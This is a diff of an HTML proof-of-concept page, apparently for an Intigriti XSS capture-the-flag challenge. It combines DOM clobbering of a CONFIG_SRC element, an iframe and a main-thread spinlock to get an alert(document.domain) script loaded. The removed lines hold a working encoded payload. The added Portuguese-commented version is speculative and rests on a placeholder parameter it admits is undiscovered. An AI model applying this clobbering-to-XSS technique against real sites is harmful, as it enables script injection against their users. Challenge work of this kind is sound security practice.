@@ -1,16 +1,53 @@
 <html>
 <body>
 <iframe id="content" style="width: 50%;height: 50%"></iframe>
-
 <script>
-function load_iframe() {
-    document.getElementById('content').src = "https://challenge-0525.intigriti.io/index.html?name=%3Cdiv%20id%3D%22CONFIG_SRC%22%20data-url%3D%22https://challenge-0525.intigriti.io/message?name=%253Cscript%253Ealert(document.domain)%253C%252Fscript%253E%22%3Etest";
-}
+    function load_iframe() {
+        document.getElementById('content').src = ''; // Boa prática para recarregar
+        console.log('Loading iframe...');
+        // 1. Use um 'name' simples que passe na regex.
+        // O valor 'trigger_html_injection' deve ser algo que,
+        // quando processado pelo backend de /message, injete o <span> de clobbering.
+        // Exemplo conceitual: se /message?name=X ecoa X cruamente (improvável com DOMPurify no meio do caminho para o *primeiro* innerHTML),
+        // ou se X ativa uma lógica no backend que insere o span.
+        // ASSUMINDO que /message?name=chosen_name_parameter injeta o span abaixo:
+        let chosen_name_parameter = "alphaNumericNameThatCausesServerToInjectClobberSpan"; // Este é o valor que você precisa descobrir para que /message o transforme no span.
 
-load_iframe();
+        // A URL que será carregada pelo <script src="...">
+        // Esta URL PRECISA que /message retorne JAVASCRIPT cru.
+        const jsPayloadUrl = "https://challenge-0525.intigriti.io/message?name=alert(document.domain)%3B%2F%2F";
 
-const busyUntil = performance.now() + 4500;
-while (performance.now() < busyUntil) {}
+        // O HTML que você quer que o endpoint /message?name=chosen_name_parameter retorne (para ser injetado no messageDiv)
+        // Nota: DOMPurify vai sanitizar isso. id e data-url (com https same-origin) devem passar.
+        // A dificuldade é fazer /message?name=chosen_name_parameter *gerar* este HTML.
+        const clobberHTML = `<img id='CONFIG_SRC' data-url='${jsPayloadUrl}'>`; // Usar <img> ou <span>, etc.
+                                                                                // O desafio real é como fazer com que
+                                                                                // /message?name=chosen_name_parameter GERE este HTML.
+
+        // Você precisa encontrar um 'chosen_name_parameter' que faça com que
+        // fetch(`/message?name=${encodeURIComponent(chosen_name_parameter)}`)
+        // retorne o 'clobberHTML' (ou algo que DOMPurify transforme nisso).
+        // Se o /message apenas ecoa o parâmetro 'name' e DOMPurify está no caminho,
+        // você não pode injetar o span diretamente via 'name' no index.html.
+        // O 'name' no index.html é usado para o fetch. A resposta do fetch é sanitizada.
+        // Portanto, o 'chosen_name_parameter' deve explorar uma vulnerabilidade no backend de /message
+        // para que o HTML de clobbering seja retornado pelo servidor.
+
+        // Simplificando, se o desafio permite que o *conteúdo retornado por /message* seja seu HTML:
+        // E você descobriu que passando name=inject_my_clobber para /message, o servidor responde com o span:
+        document.getElementById('content').src = 'https://challenge-0525.intigriti.io/index.html?name=inject_my_clobber';
+    }
+
+    console.log('Loading iframe...');
+    load_iframe();
+
+    // Seu spinlock para garantir que o clobbering ocorra antes de addDynamicScript
+    console.log('Locking up main thread');
+    const busyUntil = performance.now() + 4500; // Ajuste conforme necessário
+    while (performance.now() < busyUntil) {
+      // do nothing (spinlock)
+    }
+    console.log('Releasing Lock');
 </script>
 </body>
 </html>
